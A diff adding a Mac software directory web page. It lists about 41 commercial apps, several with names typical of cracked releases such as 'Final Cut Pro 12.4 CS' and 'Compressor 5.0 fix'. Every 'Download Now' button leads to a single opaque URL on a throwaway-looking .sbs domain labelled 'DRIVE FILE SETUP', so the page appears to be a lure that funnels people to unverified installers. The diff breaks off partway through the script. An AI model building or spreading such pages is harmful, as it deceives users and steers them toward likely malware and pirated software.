@@ -1,0 +1,1639 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Mac Files Download - Mac Software Collection</title>
+<meta name="description" content="Browse Mac software, utilities, creative applications and external download pages.">
+
+<style>
+:root {
+  --primary:#111b35;
+  --secondary:#1d3452;
+  --green:#0bb99c;
+  --green-dark:#078c78;
+  --text:#1b2942;
+  --muted:#718198;
+  --bg:#f4f7fb;
+  --border:#e3eaf3;
+}
+*{box-sizing:border-box}
+html{scroll-behavior:smooth}
+body{
+  margin:0;
+  font-family:Arial,Helvetica,sans-serif;
+  color:var(--text);
+  background:var(--bg);
+}
+a{text-decoration:none;color:inherit}
+button,input{font:inherit}
+button{cursor:pointer}
+.container{
+  max-width:1200px;
+  width:calc(100% - 36px);
+  margin:auto;
+}
+.topbar{
+  background:#0b1427;
+  color:#c0cde0;
+  text-align:center;
+  padding:10px;
+  font-size:12px;
+}
+.topbar strong{color:#54e8c8}
+
+header{
+  background:var(--primary);
+  color:white;
+  position:sticky;
+  top:0;
+  z-index:100;
+  box-shadow:0 5px 20px #0002;
+}
+.header-inner{
+  min-height:75px;
+  display:flex;
+  align-items:center;
+  justify-content:space-between;
+  gap:20px;
+}
+.logo{
+  display:flex;
+  align-items:center;
+  gap:12px;
+}
+.logo-icon{
+  width:43px;
+  height:43px;
+  background:linear-gradient(135deg,#19d5b5,#078f82);
+  border-radius:12px;
+  display:grid;
+  place-items:center;
+  font-size:25px;
+}
+.logo-title{
+  font-size:21px;
+  font-weight:900;
+  letter-spacing:-.5px;
+}
+.logo-title small{
+  display:block;
+  font-size:10px;
+  color:#a2b3cc;
+  letter-spacing:2px;
+  margin-top:5px;
+}
+nav{
+  display:flex;
+  gap:20px;
+  align-items:center;
+}
+nav a{
+  color:#cad8e9;
+  font-size:12px;
+  font-weight:bold;
+}
+nav a:hover{color:#4ee7c6}
+.menu-toggle{
+  display:none;
+  color:white;
+  background:transparent;
+  border:1px solid #ffffff44;
+  border-radius:8px;
+  padding:8px 12px;
+  font-size:20px;
+}
+
+/* HERO */
+.hero{
+  padding:65px 0;
+  color:white;
+  background:
+    radial-gradient(circle at 80% 20%,#305677 0%,transparent 45%),
+    linear-gradient(120deg,#12223c,#1b3755);
+  overflow:hidden;
+}
+.hero-inner{
+  display:grid;
+  grid-template-columns:1.2fr .8fr;
+  align-items:center;
+  gap:35px;
+}
+.eyebrow{
+  display:inline-block;
+  font-size:11px;
+  font-weight:bold;
+  letter-spacing:1px;
+  color:#5bf0d1;
+  border:1px solid #4be2bf55;
+  background:#1ba88b25;
+  padding:9px 14px;
+  border-radius:30px;
+}
+.hero h1{
+  font-size:clamp(36px,5vw,60px);
+  line-height:1.12;
+  letter-spacing:-2px;
+  margin:20px 0;
+}
+.hero h1 span{color:#65ecd2}
+.hero p{
+  color:#bfd0e2;
+  font-size:15px;
+  line-height:1.9;
+  max-width:550px;
+}
+.search-box{
+  display:flex;
+  background:white;
+  padding:6px;
+  border-radius:13px;
+  margin-top:27px;
+  max-width:600px;
+  box-shadow:0 15px 35px #0003;
+}
+.search-box input{
+  width:100%;
+  min-width:0;
+  padding:13px;
+  border:0;
+  outline:0;
+  color:#24344c;
+  font-size:14px;
+  background:transparent;
+}
+.search-box button{
+  background:var(--green);
+  color:white;
+  padding:13px 24px;
+  border:0;
+  border-radius:9px;
+  font-weight:bold;
+}
+.search-box button:hover{background:var(--green-dark)}
+.popular-tags{
+  display:flex;
+  align-items:center;
+  gap:9px;
+  flex-wrap:wrap;
+  margin-top:20px;
+  font-size:12px;
+  color:#bdccdf;
+}
+.popular-tags button{
+  background:#ffffff15;
+  color:white;
+  border:1px solid #ffffff20;
+  padding:8px 12px;
+  border-radius:30px;
+  font-size:11px;
+}
+.popular-tags button:hover{background:#0bb99c55}
+
+.hero-visual{
+  display:flex;
+  align-items:center;
+  justify-content:center;
+  position:relative;
+  min-height:300px;
+}
+.preview-window{
+  background:#edf3fc;
+  border:10px solid #293e58;
+  border-bottom-width:18px;
+  border-radius:18px;
+  padding:17px;
+  max-width:340px;
+  width:100%;
+  transform:rotate(-5deg);
+  box-shadow:0 25px 65px #0005;
+}
+.preview-title{
+  color:#344a68;
+  font-size:12px;
+  font-weight:bold;
+  margin-bottom:17px;
+}
+.preview-grid{
+  display:grid;
+  grid-template-columns:repeat(4,1fr);
+  gap:11px;
+}
+.preview-grid span{
+  background:white;
+  border-radius:13px;
+  aspect-ratio:1;
+  display:grid;
+  place-items:center;
+  font-size:28px;
+  box-shadow:0 4px 12px #0001;
+}
+
+/* STATS */
+.stats{
+  display:grid;
+  grid-template-columns:repeat(3,1fr);
+  gap:18px;
+  margin-top:-25px;
+  position:relative;
+  z-index:2;
+}
+.stat{
+  display:flex;
+  align-items:center;
+  gap:15px;
+  background:white;
+  border:1px solid var(--border);
+  border-radius:14px;
+  padding:20px;
+  box-shadow:0 10px 28px #19294312;
+}
+.stat-icon{
+  width:45px;
+  height:45px;
+  border-radius:12px;
+  background:#e6f9f4;
+  display:grid;
+  place-items:center;
+  font-size:24px;
+}
+.stat strong{
+  display:block;
+  font-size:17px;
+  margin-bottom:4px;
+}
+.stat small{
+  color:var(--muted);
+  font-size:11px;
+}
+
+/* SECTIONS */
+section.content-section{
+  margin-top:50px;
+  scroll-margin-top:110px;
+}
+.section-heading{
+  display:flex;
+  justify-content:space-between;
+  gap:15px;
+  align-items:center;
+  margin-bottom:22px;
+}
+.section-heading h2{
+  font-size:25px;
+  letter-spacing:-.5px;
+  margin:0 0 7px;
+}
+.section-heading p{
+  color:var(--muted);
+  font-size:13px;
+  margin:0;
+}
+.view-all{
+  color:#059d85;
+  font-weight:bold;
+  font-size:12px;
+  white-space:nowrap;
+}
+
+/* CATEGORIES */
+.category-grid{
+  display:grid;
+  grid-template-columns:repeat(7,minmax(0,1fr));
+  gap:12px;
+}
+.category-card{
+  background:white;
+  border:1px solid var(--border);
+  padding:18px 8px;
+  border-radius:14px;
+  text-align:center;
+  transition:.2s;
+  width:100%;
+}
+.category-card:hover,
+.category-card.active{
+  border-color:var(--green);
+  transform:translateY(-3px);
+  box-shadow:0 10px 24px #0bb99c20;
+}
+.category-card .emoji{
+  width:48px;
+  height:48px;
+  display:grid;
+  place-items:center;
+  margin:0 auto 13px;
+  border-radius:13px;
+  background:linear-gradient(130deg,#e4faf5,#eaf1ff);
+  font-size:24px;
+}
+.category-card strong{
+  display:block;
+  font-size:11px;
+  line-height:1.5;
+}
+.category-card small{
+  display:block;
+  font-size:10px;
+  color:#93a1b2;
+  margin-top:7px;
+}
+
+/* SOFTWARE CARDS */
+.software-grid{
+  display:grid;
+  grid-template-columns:repeat(4,minmax(0,1fr));
+  gap:19px;
+}
+.software-grid.three{
+  grid-template-columns:repeat(3,minmax(0,1fr));
+}
+.app-card{
+  background:white;
+  border:1px solid var(--border);
+  border-radius:16px;
+  overflow:hidden;
+  display:flex;
+  flex-direction:column;
+  min-width:0;
+  transition:.25s;
+  box-shadow:0 6px 25px #26385909;
+}
+.app-card:hover{
+  transform:translateY(-5px);
+  box-shadow:0 16px 38px #243b5b20;
+  border-color:#b6e6d9;
+}
+.app-cover{
+  height:145px;
+  background:linear-gradient(130deg,var(--c1),var(--c2));
+  display:flex;
+  align-items:center;
+  justify-content:center;
+  position:relative;
+  overflow:hidden;
+}
+.app-cover:before{
+  content:"";
+  position:absolute;
+  height:150px;
+  width:150px;
+  border:1px solid #ffffff50;
+  border-radius:50%;
+  right:-55px;
+  top:-85px;
+}
+.app-icon{
+  width:77px;
+  height:77px;
+  display:grid;
+  place-items:center;
+  background:#fffffff0;
+  border-radius:20px;
+  font-size:39px;
+  transform:rotate(-5deg);
+  box-shadow:0 12px 30px #0002;
+}
+.app-badge{
+  position:absolute;
+  left:12px;
+  top:12px;
+  background:#e4fff5;
+  color:#087661;
+  font-size:9px;
+  font-weight:900;
+  text-transform:uppercase;
+  letter-spacing:.6px;
+  border-radius:7px;
+  padding:6px 9px;
+}
+.app-info{
+  padding:17px;
+  display:flex;
+  flex-direction:column;
+  flex:1;
+}
+.app-category{
+  color:#0ba98f;
+  text-transform:uppercase;
+  font-size:10px;
+  font-weight:900;
+  letter-spacing:.8px;
+}
+.app-info h3{
+  font-size:15px;
+  line-height:1.5;
+  margin:9px 0;
+  min-height:44px;
+}
+.app-info p{
+  color:#7b899f;
+  font-size:12px;
+  line-height:1.7;
+  min-height:40px;
+  margin:0 0 16px;
+}
+.app-meta{
+  color:#98a5b5;
+  font-size:11px;
+  margin-top:auto;
+  margin-bottom:14px;
+}
+.download-btn{
+  background:var(--green);
+  display:block;
+  color:white;
+  font-size:12px;
+  font-weight:bold;
+  text-align:center;
+  padding:13px 10px;
+  border-radius:10px;
+  transition:.2s;
+}
+.download-btn:hover{
+  background:var(--green-dark);
+  transform:translateY(-2px);
+}
+.download-note{
+  color:#98a5b5;
+  font-size:10px;
+  text-align:center;
+  margin-top:9px;
+}
+
+/* FILTER */
+.filter-info{
+  display:none;
+  padding:13px 16px;
+  border:1px solid #c5eadf;
+  background:#e9faf5;
+  color:#467366;
+  border-radius:11px;
+  font-size:13px;
+  margin-bottom:20px;
+  justify-content:space-between;
+  gap:12px;
+}
+.filter-info.show{display:flex}
+.filter-info button{
+  border:0;
+  background:none;
+  color:#048b75;
+  font-weight:bold;
+}
+.empty-state{
+  display:none;
+  text-align:center;
+  background:white;
+  border:1px dashed #c6d2e3;
+  padding:45px 15px;
+  border-radius:14px;
+  color:#75859a;
+}
+.empty-state strong{
+  display:block;
+  font-size:21px;
+  margin:12px 0;
+}
+
+/* BANNER */
+.bottom-banner{
+  margin-top:50px;
+  padding:30px 34px;
+  background:linear-gradient(115deg,#13233d,#10847e);
+  color:white;
+  border-radius:18px;
+  display:flex;
+  justify-content:space-between;
+  align-items:center;
+  gap:20px;
+}
+.bottom-banner h2{
+  font-size:22px;
+  margin:0 0 8px;
+}
+.bottom-banner p{
+  color:#c6e4e1;
+  font-size:13px;
+  margin:0;
+}
+.bottom-banner a{
+  background:white;
+  color:#12665e;
+  border-radius:10px;
+  font-size:12px;
+  font-weight:bold;
+  padding:14px 20px;
+  white-space:nowrap;
+}
+
+/* FOOTER */
+footer{
+  margin-top:65px;
+  background:#111b35;
+  color:#a7b8cc;
+  padding:40px 0 22px;
+}
+.footer-main{
+  display:flex;
+  justify-content:space-between;
+  gap:25px;
+  border-bottom:1px solid #ffffff18;
+  padding-bottom:27px;
+}
+.footer-main h2{
+  color:white;
+  font-size:20px;
+  margin:0 0 10px;
+}
+.footer-main p{
+  max-width:550px;
+  font-size:12px;
+  line-height:1.9;
+  margin:0;
+}
+.footer-links{
+  display:flex;
+  gap:16px;
+  flex-wrap:wrap;
+  font-size:12px;
+}
+.footer-bottom{
+  padding-top:20px;
+  font-size:11px;
+  display:flex;
+  justify-content:space-between;
+  gap:12px;
+}
+
+/* RESPONSIVE */
+@media(max-width:1100px){
+  nav{gap:10px}
+  nav a{font-size:11px}
+  .category-grid{grid-template-columns:repeat(4,1fr)}
+  .software-grid{grid-template-columns:repeat(3,1fr)}
+}
+@media(max-width:760px){
+  .header-inner{min-height:67px}
+  .menu-toggle{display:block}
+  nav{
+    display:none;
+    position:absolute;
+    left:0;
+    right:0;
+    top:100%;
+    padding:15px 20px;
+    background:#182943;
+    flex-direction:column;
+    align-items:stretch;
+    box-shadow:0 10px 25px #0003;
+  }
+  nav.open{display:flex}
+  nav a{
+    padding:12px 5px;
+    font-size:13px;
+    border-bottom:1px solid #ffffff13;
+  }
+  .hero{padding:45px 0}
+  .hero-inner{grid-template-columns:1fr}
+  .hero-visual{display:none}
+  .stats{grid-template-columns:1fr;gap:10px}
+  .category-grid{grid-template-columns:repeat(3,1fr)}
+  .software-grid,
+  .software-grid.three{
+    grid-template-columns:repeat(2,minmax(0,1fr));
+  }
+  .footer-main{flex-direction:column}
+  .bottom-banner{flex-direction:column;align-items:stretch}
+}
+@media(max-width:480px){
+  .container{width:calc(100% - 28px)}
+  .logo-title{font-size:18px}
+  .hero h1{letter-spacing:-1px}
+  .hero p{font-size:13px}
+  .search-box button{padding:13px 15px}
+  .category-grid{grid-template-columns:repeat(2,1fr)}
+  .software-grid,
+  .software-grid.three{
+    grid-template-columns:1fr;
+  }
+  .app-info h3,
+  .app-info p{min-height:0}
+  .section-heading h2{font-size:22px}
+  .footer-bottom{flex-direction:column}
+}
+</style>
+</head>
+
+<body>
+
+<div class="topbar">
+  🌿 Your Mac software library —
+  <strong>Explore apps and external downloads</strong>
+</div>
+
+<header>
+  <div class="container header-inner">
+
+    <a href="#top" class="logo">
+      <span class="logo-icon">⬇</span>
+      <span class="logo-title">
+        Mac Files Download
+        <small>SOFTWARE COLLECTION</small>
+      </span>
+    </a>
+
+    <button
+      class="menu-toggle"
+      id="menuToggle"
+      aria-label="Open menu"
+      aria-expanded="false"
+    >☰</button>
+
+    <nav id="navigation">
+      <a href="#top" id="homeLink">Home</a>
+      <a href="#browse" data-category="Mac Utilities">Mac Utilities</a>
+      <a href="#browse" data-category="Mac Video">Mac Video</a>
+      <a href="#browse" data-category="Mac Audio">Mac Audio</a>
+      <a href="#browse" data-category="Mac Photo & Design">Photo & Design</a>
+      <a href="#browse" data-category="Mac Security">Security</a>
+      <a href="#browse" data-category="Mac Business">Business</a>
+      <a href="#browse" data-category="Mac Developer Tools">Developer</a>
+    </nav>
+
+  </div>
+</header>
+
+<main id="top">
+
+<!-- HERO SECTION -->
+<div class="hero">
+  <div class="container hero-inner">
+
+    <div>
+      <span class="eyebrow">✦ DISCOVER POPULAR MAC APPS</span>
+
+      <h1>
+        Mac software,<br>
+        <span>all in one place.</span>
+      </h1>
+
+      <p>
+        Discover Mac utilities, video editors, music production
+        tools, photo editing applications, creative software
+        and more. Browse software and open external download pages.
+      </p>
+
+      <form class="search-box" id="searchForm">
+        <input
+          id="searchInput"
+          type="search"
+          placeholder="Search apps & software..."
+          aria-label="Search software"
+        >
+        <button type="submit">Search</button>
+      </form>
+
+      <div class="popular-tags">
+        <strong>Popular:</strong>
+        <button data-category="Mac Audio">Mac Audio</button>
+        <button data-category="Mac Utilities">Utilities</button>
+        <button data-category="Mac Video">Mac Video</button>
+        <button data-category="Mac Photo & Design">Design</button>
+      </div>
+    </div>
+
+    <div class="hero-visual">
+      <div class="preview-window">
+        <div class="preview-title">
+          ● ● ● &nbsp; My Software Library
+        </div>
+        <div class="preview-grid">
+          <span>🎬</span>
+          <span>🎹</span>
+          <span>🧹</span>
+          <span>🎨</span>
+          <span>🖥️</span>
+          <span>🔒</span>
+          <span>📊</span>
+          <span>🎧</span>
+        </div>
+      </div>
+    </div>
+
+  </div>
+</div>
+
+<!-- STATISTICS -->
+<div class="container stats">
+
+  <div class="stat">
+    <span class="stat-icon">📦</span>
+    <div>
+      <strong id="appCount">41</strong>
+      <small>Software listings</small>
+    </div>
+  </div>
+
+  <div class="stat">
+    <span class="stat-icon">🗂️</span>
+    <div>
+      <strong>7 Categories</strong>
+      <small>Easy software browsing</small>
+    </div>
+  </div>
+
+  <div class="stat">
+    <span class="stat-icon">↗️</span>
+    <div>
+      <strong>External Downloads</strong>
+      <small>Open in a new tab</small>
+    </div>
+  </div>
+
+</div>
+
+<!-- CATEGORIES -->
+<section class="container content-section" id="categories">
+
+  <div class="section-heading">
+    <div>
+      <h2>Browse Categories</h2>
+      <p>Explore software by category.</p>
+    </div>
+  </div>
+
+  <div class="category-grid" id="categoryGrid"></div>
+
+</section>
+
+<!-- RECENT -->
+<section class="container content-section" id="recent">
+
+  <div class="section-heading">
+    <div>
+      <h2>⚡ Recently Updated</h2>
+      <p>Software listings from the collection.</p>
+    </div>
+    <a href="#browse" class="view-all">Browse All ↗</a>
+  </div>
+
+  <div class="software-grid three" id="recentGrid"></div>
+
+</section>
+
+<!-- FEATURED -->
+<section class="container content-section" id="featured">
+
+  <div class="section-heading">
+    <div>
+      <h2>⭐ Featured Software</h2>
+      <p>Popular desktop apps and useful tools.</p>
+    </div>
+  </div>
+
+  <div class="software-grid" id="featuredGrid"></div>
+
+</section>
+
+<!-- MORE SOFTWARE -->
+<section class="container content-section" id="browse">
+
+  <div class="section-heading">
+    <div>
+      <h2 id="browseTitle">More Mac Software</h2>
+      <p>Explore the software collection below.</p>
+    </div>
+    <a href="#categories" class="view-all">All Categories ↑</a>
+  </div>
+
+  <div class="filter-info" id="filterInfo">
+    <span id="filterText"></span>
+    <button id="clearFilter">Clear Filters ✕</button>
+  </div>
+
+  <div class="software-grid" id="moreGrid"></div>
+
+  <div class="empty-state" id="emptyState">
+    🔍
+    <strong>No apps found</strong>
+    Try another software name or category.
+  </div>
+
+</section>
+
+<!-- LATEST -->
+<section class="container content-section" id="latest">
+
+  <div class="section-heading">
+    <div>
+      <h2>🆕 Latest Added</h2>
+      <p>Explore more software titles.</p>
+    </div>
+  </div>
+
+  <div class="software-grid" id="latestGrid"></div>
+
+</section>
+
+<!-- POPULAR -->
+<section class="container content-section" id="popular">
+
+  <div class="section-heading">
+    <div>
+      <h2>🔥 Popular Mac Downloads</h2>
+      <p>Explore well-known Mac applications.</p>
+    </div>
+  </div>
+
+  <div class="software-grid" id="popularGrid"></div>
+
+</section>
+
+<!-- BOTTOM BANNER -->
+<div class="container">
+  <div class="bottom-banner">
+    <div>
+      <h2>Looking for a Mac application?</h2>
+      <p>Find your software using our search feature.</p>
+    </div>
+    <a href="#top">Search Apps ↑</a>
+  </div>
+</div>
+
+</main>
+
+<footer>
+  <div class="container">
+
+    <div class="footer-main">
+      <div>
+        <h2>Mac Files Download</h2>
+        <p>
+          Independent software directory for Mac applications,
+          creative software, utilities and productivity tools.
+          Download buttons lead to an external third-party website.
+          We do not host or verify installer files. Always verify
+          the destination before downloading anything.
+        </p>
+      </div>
+
+      <div class="footer-links">
+        <a href="#top">Home</a>
+        <a href="#categories">Categories</a>
+        <a href="#featured">Featured</a>
+        <a href="#latest">Latest Added</a>
+      </div>
+    </div>
+
+    <div class="footer-bottom">
+      <span>© <span id="year"></span> Mac Files Download</span>
+      <span>All Rights Reserved | GitHub Pages</span>
+    </div>
+
+  </div>
+</footer>
+
+<script>
+"use strict";
+
+/*
+=================================================
+DOWNLOAD URL
+Change this single link for all download buttons.
+=================================================
+*/
+
+const DOWNLOAD_URL =
+"https://asdfghn.sbs/?z=MzIw&n=DRIVE%20FILE%20SETUP";
+
+/*
+=================================================
+SOFTWARE LIST
+Add new software by copying an entry below.
+=================================================
+*/
+
+const software = [
+
+{
+  name:"SpeedCleaner Pro",
+  category:"Mac Utilities",
+  icon:"⚡",
+  desc:"Quick tools for tidying temporary files.",
+  group:"recent"
+},
+{
+  name:"AudioForge",
+  category:"Mac Audio",
+  icon:"🎵",
+  desc:"Audio editing and mixing software.",
+  group:"recent"
+},
+{
+  name:"SafeShield VPN",
+  category:"Mac Security",
+  icon:"🛡️",
+  desc:"VPN-style privacy and browsing utility.",
+  group:"recent"
+},
+
+/* FEATURED SOFTWARE */
+
+{
+  name:"CleanMyMac for Mac",
+  category:"Mac Utilities",
+  icon:"🧹",
+  desc:"Mac maintenance, cleanup and utility tools.",
+  group:"featured"
+},
+{
+  name:"Filmora for Mac",
+  category:"Mac Video",
+  icon:"🎬",
+  desc:"Video editor with creative timeline tools.",
+  group:"featured"
+},
+{
+  name:"FL Studio for Mac",
+  category:"Mac Audio",
+  icon:"🎹",
+  desc:"Music production and audio workstation.",
+  group:"featured"
+},
+{
+  name:"iTop VPN for Mac",
+  category:"Mac Security",
+  icon:"🔒",
+  desc:"VPN product for private network connections.",
+  group:"featured"
+},
+
+/* MORE SOFTWARE */
+
+{
+  name:"VMware Fusion Pro for Mac",
+  category:"Mac Developer Tools",
+  icon:"🖥️",
+  desc:"Virtual machines and operating system tools.",
+  group:"more"
+},
+{
+  name:"Serato DJ Pro Suite v3.2.2 for Mac",
+  category:"Mac Audio",
+  icon:"🎧",
+  desc:"Professional DJ mixing software.",
+  group:"more"
+},
+{
+  name:"RAR Extractor Max-Unzip Winrar 9.8.0 for Mac",
+  category:"Mac Utilities",
+  icon:"🗜️",
+  desc:"Extract compressed archive files.",
+  group:"more"
+},
+{
+  name:"Imagenomic Portraiture for PS 3.5.7 Build 3570 for Mac",
+  category:"Mac Photo & Design",
+  icon:"🖼️",
+  desc:"Portrait photography retouching tools.",
+  group:"more"
+},
+{
+  name:"iZotope Neutron 5 v5.2.0 for Mac",
+  category:"Mac Audio",
+  icon:"🎚️",
+  desc:"Audio mixing and production effects.",
+  group:"more"
+},
+{
+  name:"Microsoft Office 2024 v16.107 for Mac",
+  category:"Mac Business",
+  icon:"📊",
+  desc:"Productivity applications for office work.",
+  group:"more"
+},
+{
+  name:"macOS Mojave 10.14.6 (18G103) for Mac",
+  category:"Mac Utilities",
+  icon:"💻",
+  desc:"Historical macOS operating system release.",
+  group:"more"
+},
+{
+  name:"Logic Pro 12.3.1 for Mac",
+  category:"Mac Audio",
+  icon:"🎼",
+  desc:"Music recording and production application.",
+  group:"more"
+},
+{
+  name:"IObit Driver Booster PRO Portable",
+  category:"Mac Utilities",
+  icon:"⚙️",
+  desc:"Windows driver updater, not a Mac application.",
+  group:"more"
+},
+{
+  name:"GraphPad Prism 10.1.1.270 for Mac",
+  category:"Mac Business",
+  icon:"📈",
+  desc:"Scientific graphing and statistical analysis.",
+  group:"more"
+},
+{
+  name:"FL Studio 26 for Mac",
+  category:"Mac Audio",
+  icon:"🎛️",
+  desc:"Music composition and production software.",
+  group:"more"
+},
+{
+  name:"Final Cut Pro 12.4 CS for Mac",
+  category:"Mac Video",
+  icon:"🎞️",
+  desc:"Professional video editing application.",
+  group:"more"
+},
+{
+  name:"Claris FileMaker Pro 19.5.1.36 for Mac",
+  category:"Mac Business",
+  icon:"🗄️",
+  desc:"Custom database and business applications.",
+  group:"more"
+},
+{
+  name:"EndNote 2025.3 for Mac",
+  category:"Mac Business",
+  icon:"📚",
+  desc:"Reference management for researchers.",
+  group:"more"
+},
+{
+  name:"DaVinci Resolve Studio 21.1.1 for Mac",
+  category:"Mac Video",
+  icon:"🎥",
+  desc:"Video editing, color grading and effects.",
+  group:"more"
+},
+{
+  name:"Compressor 5.0 fix for Mac",
+  category:"Mac Video",
+  icon:"🎬",
+  desc:"Video compression and media encoding tools.",
+  group:"more"
+},
+{
+  name:"CleanMyMac 5.5.6 for Mac",
+  category:"Mac Utilities",
+  icon:"🧽",
+  desc:"Mac system cleanup and maintenance.",
+  group:"more"
+},
+{
+  name:"Capture One Pro 16.7.5.7 for Mac",
+  category:"Mac Photo & Design",
+  icon:"📷",
+  desc:"Professional photography editing software.",
+  group:"more"
+},
+{
+  name:"Adobe Premiere Pro 2026 v26.0.2 for Mac",
+  category:"Mac Video",
+  icon:"🎬",
+  desc:"Professional timeline video editing.",
+  group:"more"
+},
+{
+  name:"Adobe Photoshop 2026 27.11 for Mac",
+  category:"Mac Photo & Design",
+  icon:"🎨",
+  desc:"Professional image editing and graphics.",
+  group:"more"
+},
+{
+  name:"Adobe Illustrator 2026 30.8.1 for Mac",
+  category:"Mac Photo & Design",
+  icon:"✒️",
+  desc:"Vector graphics and illustration software.",
+  group:"more"
+},
+{
+  name:"Ableton Live 12 Suite for Mac",
+  category:"Mac Audio",
+  icon:"🎵",
+  desc:"Music creation, recording and production.",
+  group:"more"
+},
+
+/* LATEST ADDED */
+
+{
+  name:"Baby Audio Tekno 1.1.1 for Mac",
+  category:"Mac Audio",
+  icon:"🥁",
+  desc:"Electronic drum sound design.",
+  group:"latest"
+},
+{
+  name:"Back-In-Time 5.1.1 for Mac",
+  category:"Mac Utilities",
+  icon:"🕒",
+  desc:"Browse Time Machine backup information.",
+  group:"latest"
+},
+{
+  name:"Background Music Abstractor 5.8.5 for Mac",
+  category:"Mac Audio",
+  icon:"🎶",
+  desc:"Audio utility for Mac users.",
+  group:"latest"
+},
+{
+  name:"Backgrounds 10.0 for Mac",
+  category:"Mac Utilities",
+  icon:"🌄",
+  desc:"Desktop wallpaper customization.",
+  group:"latest"
+},
+{
+  name:"Backtrack 2.6.0 for Mac",
+  category:"Mac Audio",
+  icon:"🎙️",
+  desc:"Audio recording and capture utility.",
+  group:"latest"
+},
+{
+  name:"BackupLoupe 3.15.2 for Mac",
+  category:"Mac Utilities",
+  icon:"💾",
+  desc:"Browse and inspect backup files.",
+  group:"latest"
+},
+{
+  name:"balenaEtcher 2.1.9 for Mac",
+  category:"Mac Utilities",
+  icon:"📀",
+  desc:"Flash operating system images to USB drives.",
+  group:"latest"
+},
+{
+  name:"Balrum 1.12 for Mac",
+  category:"Mac Utilities",
+  icon:"🎮",
+  desc:"Fantasy role-playing game listing.",
+  group:"latest"
+},
+{
+  name:"Balsamiq Wireframes 4.8.6 for Mac",
+  category:"Mac Photo & Design",
+  icon:"📐",
+  desc:"User interface wireframing software.",
+  group:"latest"
+},
+{
+  name:"Bandizip 7.47 for Mac",
+  category:"Mac Utilities",
+  icon:"📦",
+  desc:"File archiving and compression.",
+  group:"latest"
+},
+{
+  name:"Banktivity 10.1.2 for Mac",
+  category:"Mac Business",
+  icon:"💳",
+  desc:"Budgeting and personal finance tools.",
+  group:"latest"
+},
+{
+  name:"BAO Mask Avenger for After Effects 2.7.5 for Mac",
+  category:"Mac Video",
+  icon:"✨",
+  desc:"Masking tools for motion graphics.",
+  group:"latest"
+}
+
+];
+
+/*
+=================================================
+CATEGORIES
+=================================================
+*/
+
+const categories = [
+  {name:"Mac Audio",icon:"🎵"},
+  {name:"Mac Business",icon:"💼"},
+  {name:"Mac Developer Tools",icon:"👨‍💻"},
+  {name:"Mac Photo & Design",icon:"🎨"},
+  {name:"Mac Security",icon:"🛡️"},
+  {name:"Mac Utilities",icon:"⚙️"},
+  {name:"Mac Video",icon:"🎬"}
+];
+
+/*
+=================================================
+CARD COLORS
+=================================================
+*/
+
+const colors = [
+  ["#5b70d4","#56c7d7"],
+  ["#aa5ae9","#f37fa5"],
+  ["#159d96","#4cdfbd"],
+  ["#ed9557","#edc96b"],
+  ["#4670bc","#70bdeb"],
+  ["#7355ac","#b59aea"],
+  ["#dd626e","#f0a08d"],
+  ["#237b87","#5ac8b9"]
+];
+
+let selectedCategory = "";
+let currentQuery = "";
+
+/*
+=================================================
+HTML ESCAPE
+=================================================
+*/
+
+function escapeHTML(value){
+  return String(value).replace(/[&<>"']/g, function(c){
+    return {
+      "&":"&amp;",
+      "<":"&lt;",
+      ">":"&gt;",
+      '"':"&quot;",
+      "'":"&#39;"
+    }[c];
+  });
+}
+
+/*
+=================================================
+GENERATE SOFTWARE CARD
+=================================================
+*/
+
+function createCard(item,index,badge=""){
+
+  const color = colors[index % colors.length];
+
+  const name = escapeHTML(item.name);
+  const category = escapeHTML(item.category);
+  const desc = escapeHTML(item.desc);
+
+  return `
+    <article class="app-card">
+
+      <div class="app-cover"
+           style="--c1:${color[0]};--c2:${color[1]}">
+
+        ${badge ? `
+          <span class="app-badge">${escapeHTML(badge)}</span>
+        ` : ""}
+
+        <div class="app-icon">${item.icon}</div>
+
+      </div>
+
+      <div class="app-info">
+
+        <span class="app-category">${category}</span>
+
+        <h3>${name}</h3>
+
+        <p>${desc}</p>
+
+        <div class="app-meta">
+          Mac Software • Browse Download Options
+        </div>
+
+        <a
+          href="${escapeHTML(DOWNLOAD_URL)}"
+          class="download-btn"
+          target="_blank"
+          rel="noopener noreferrer"
+          aria-label="Open external download page for ${name}"
+        >
+          ⬇ Download Now ↗
+        </a>
+
+        <div class="download-note">
+          Opens an external website
+        </div>
+
+      </div>
+
+    </article>
+  `;
+}
+
+/*
+=================================================
+DRAW SOFTWARE SECTIONS
+=================================================
+*/
+
+function drawSoftware(){
+
+  const filtering = Boolean(selectedCategory || currentQuery);
+
+  const matches = item => {
+
+    const categoryMatch =
+      !selectedCategory ||
+      item.category === selectedCategory;
+
+    const text =
+      (item.name+" "+item.category+" "+item.desc)
+      .toLowerCase();
+
+    const searchMatch =
+      !currentQuery || text.includes(currentQuery);
+
+    return categoryMatch && searchMatch;
+  };
+
+  const results = software.filter(matches);
+
+  const groups = [
+    ["recent","recentGrid","Updated"],
+    ["featured","featuredGrid","Featured"],
+    ["more","moreGrid",""],
+    ["latest","latestGrid","New"]
+  ];
+
+  groups.forEach(function(group){
+
+    const groupName = group[0];
+    const elementId = group[1];
+    const badge = group[2];
+
+    const grid = document.getElementById(elementId);
+
+    let items;
+
+    if(filtering){
+      items = groupName === "more" ? results : [];
+    } else {
+      items = software.filter(item=>item.group===groupName);
+    }
+
+    grid.innerHTML = items.map(function(item){
+      return createCard(
+        item,
+        software.indexOf(item),
+        badge
+      );
+    }).join("");
+
+    const section = grid.closest("section");
+
+    section.style.display =
+      groupName === "more" || items.length ? "" : "none";
+  });
+
+  document.getElementById("browseTitle").textContent =
+    filtering ? "Search Results" : "More Mac Software";
+
+  const popularNames = [
+    "iTop VPN for Mac",
+    "CleanMyMac for Mac",
+    "Filmora for Mac",
+    "FL Studio for Mac"
+  ];
+
+  const popularItems = filtering ? [] :
+    popularNames
+      .map(name=>software.find(item=>item.name===name))
+      .filter(Boolean);
+
+  document.getElementById("popularGrid").innerHTML =
+    popularItems.map(function(item){
+      return createCard(
+        item,
+        software.indexOf(item),
+        "Popular"
+      );
+    }).join("");
+
+  document.getElementById("popular").style.display =
+    popularItems.length ? "" : "none";
+
+  document.getElementById("emptyState").style.display =
+    results.length ? "none" : "block";
+
+  const filterInfo = document.getElementById("filterInfo");
+
+  filterInfo.classList.toggle("show",filtering);
+
+  document.getElementById("filterText").textContent =
+    results.length + " results" +
+    (selectedCategory ? " in " + selectedCategory : "") +
+    (currentQuery ? ' for "' + currentQuery + '"' : "");
+
